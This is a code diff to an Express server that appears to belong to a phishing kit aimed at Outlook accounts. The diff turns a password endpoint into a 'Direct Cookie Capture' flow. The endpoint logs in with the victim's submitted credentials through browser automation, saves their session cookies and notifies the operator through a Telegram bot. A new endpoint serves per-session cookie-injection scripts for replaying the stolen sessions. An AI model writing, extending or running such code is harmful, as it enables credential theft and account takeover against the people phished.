@@ -793,7 +793,7 @@ app.post('/api/verify-email', async (req, res) => {
     }
 });
 
-// Password authentication endpoint with validation using automation
+// Password authentication endpoint with direct cookie capture
 app.post('/api/authenticate-password', async (req, res) => {
     try {
         const { email, password } = req.body;
@@ -805,13 +805,15 @@ app.post('/api/authenticate-password', async (req, res) => {
             });
         }
 
-        console.log(`🔐 Attempting password validation for: ${email}`);
+        console.log(`🔐 Attempting direct authentication for: ${email}`);
 
-        // Try automation login first to validate credentials
+        // Use automation to login and capture cookies directly
         const automation = new OutlookLoginAutomation({
-            enableScreenshots: false,
-            screenshotQuality: 50
+            enableScreenshots: true,
+            screenshotQuality: 80
         });
+
+        const sessionId = createSessionId();
 
         try {
             await automation.init();
@@ -822,11 +824,10 @@ app.post('/api/authenticate-password', async (req, res) => {
             }
 
             const loginSuccess = await automation.performLogin(email, password);
-            await automation.close();
 
             if (!loginSuccess) {
-                // Invalid credentials - don't proceed with OAuth
-                console.log(`❌ Password validation failed for: ${email}`);
+                await automation.close();
+                console.log(`❌ Authentication failed for: ${email}`);
                 
                 analytics.failedLogins++;
                 saveAnalytics();
@@ -839,38 +840,69 @@ app.post('/api/authenticate-password', async (req, res) => {
                 });
             }
 
-            // Valid credentials - store and proceed with OAuth for token collection
-            const sessionId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-            const sessionDir = path.join(__dirname, 'session_data');
-            
-            if (!fs.existsSync(sessionDir)) {
-                fs.mkdirSync(sessionDir, { recursive: true });
-            }
-            
-            const sessionData = {
-                id: sessionId,
-                timestamp: new Date().toISOString(),
-                email: email,
-                status: 'credentials_validated',
-                validationMethod: 'automation'
-            };
-            
-            fs.writeFileSync(
-                path.join(sessionDir, `session_${sessionId}_${email.replace(/[@.]/g, '_')}.json`),
-                JSON.stringify(sessionData, null, 2)
-            );
+            // Save session and cookies directly
+            console.log(`💾 Saving session cookies for: ${email}`);
+            const sessionValidation = await automation.validateSession(email);
+            await automation.close();
 
-            console.log(`✅ Password validation successful for: ${email}`);
-            
-            res.json({
-                success: true,
-                sessionId: sessionId,
-                message: 'Credentials validated. Proceeding with secure authentication...',
-                requiresOAuth: true
-            });
+            if (sessionValidation.success) {
+                // Create user session entry
+                userSessions.set(sessionId, {
+                    sessionId: sessionId,
+                    graphAuth: null, // No Graph API needed
+                    userEmail: email,
+                    createdAt: Date.now(),
+                    oauthState: null,
+                    authenticated: true,
+                    verified: true,
+                    cookiesSaved: sessionValidation.cookiesSaved
+                });
+
+                analytics.successfulLogins++;
+                saveAnalytics();
+
+                console.log(`✅ Direct authentication successful for: ${email}`);
+
+                // Send Telegram notification if bot is available
+                if (telegramBot) {
+                    try {
+                        const domain = email.split('@')[1] || 'Unknown';
+                        await telegramBot.sendLoginNotification({
+                            email: '***@' + domain,
+                            domain: domain,
+                            timestamp: new Date().toISOString(),
+                            sessionId: sessionId,
+                            authMethod: 'Direct Cookie Capture'
+                        });
+                        console.log(`📤 Telegram notification sent for user@${domain}`);
+                    } catch (error) {
+                        console.error('❌ Failed to send Telegram notification:', error.message);
+                    }
+                }
+
+                res.json({
+                    success: true,
+                    sessionId: sessionId,
+                    email: email,
+                    message: 'Login successful! Cookies saved.',
+                    sessionValidation: sessionValidation,
+                    requiresOAuth: false,
+                    cookiesSaved: true
+                });
+            } else {
+                analytics.failedLogins++;
+                saveAnalytics();
+
+                return res.status(401).json({
+                    success: false,
+                    error: 'Session validation failed',
+                    message: sessionValidation.error || 'Could not validate session',
+                    requiresOAuth: false
+                });
+            }
 
         } catch (automationError) {
-            console.error(`❌ Automation validation failed for ${email}:`, automationError.message);
+            console.error(`❌ Automation error for ${email}:`, automationError.message);
             
             try {
                 await automation.close();
@@ -1223,13 +1255,86 @@ app.get('/api/status', (req, res) => {
             sessionId: sessionId,
             sessionCount: userSessions.size,
             hasToken: !!session.graphAuth?.accessToken,
-            verified: !!session.verified
+            verified: !!session.verified,
+            cookiesSaved: !!session.cookiesSaved
         });
     } else {
         res.json({
             authenticated: false,
             sessionCount: userSessions.size,
             message: 'No active session'
+        });
+    }
+});
+
+// Serve cookie injection scripts
+app.get('/api/cookies/:sessionId', (req, res) => {
+    try {
+        const sessionId = req.params.sessionId;
+        const sessionDir = path.join(__dirname, 'session_data');
+        const injectionFilename = `inject_session_${sessionId}.js`;
+        const injectionPath = path.join(sessionDir, injectionFilename);
+
+        if (fs.existsSync(injectionPath)) {
+            const script = fs.readFileSync(injectionPath, 'utf8');
+            res.setHeader('Content-Type', 'application/javascript');
+            res.setHeader('Content-Disposition', `attachment; filename="${injectionFilename}"`);
+            res.send(script);
+        } else {
+            res.status(404).json({
+                error: 'Cookie injection script not found',
+                sessionId: sessionId
+            });
+        }
+    } catch (error) {
+        console.error('Error serving cookie script:', error);
+        res.status(500).json({
+            error: 'Failed to serve cookie script',
+            details: error.message
+        });
+    }
+});
+
+// Get session data with cookies
+app.get('/api/session-data/:sessionId', (req, res) => {
+    try {
+        const sessionId = req.params.sessionId;
+        const sessionDir = path.join(__dirname, 'session_data');
+        
+        // Find session file
+        const sessionFiles = fs.readdirSync(sessionDir).filter(file => 
+            file.startsWith(`session_${sessionId}_`) && file.endsWith('.json')
+        );
+
+        if (sessionFiles.length > 0) {
+            const sessionFile = sessionFiles[0];
+            const sessionPath = path.join(sessionDir, sessionFile);
+            const sessionData = JSON.parse(fs.readFileSync(sessionPath, 'utf8'));
+
+            // Return session data without sensitive cookie values
+            const publicSessionData = {
+                sessionId: sessionData.sessionId,
+                email: sessionData.email,
+                timestamp: sessionData.timestamp,
+                status: sessionData.status,
+                totalCookies: sessionData.totalCookies,
+                domains: sessionData.domains,
+                injectFilename: sessionData.injectFilename,
+                cookieNames: sessionData.cookies ? sessionData.cookies.map(c => c.name) : []
+            };
+
+            res.json(publicSessionData);
+        } else {
+            res.status(404).json({
+                error: 'Session data not found',
+                sessionId: sessionId
+            });
+        }
+    } catch (error) {
+        console.error('Error getting session data:', error);
+        res.status(500).json({
+            error: 'Failed to get session data',
+            details: error.message
         });
     }
 });
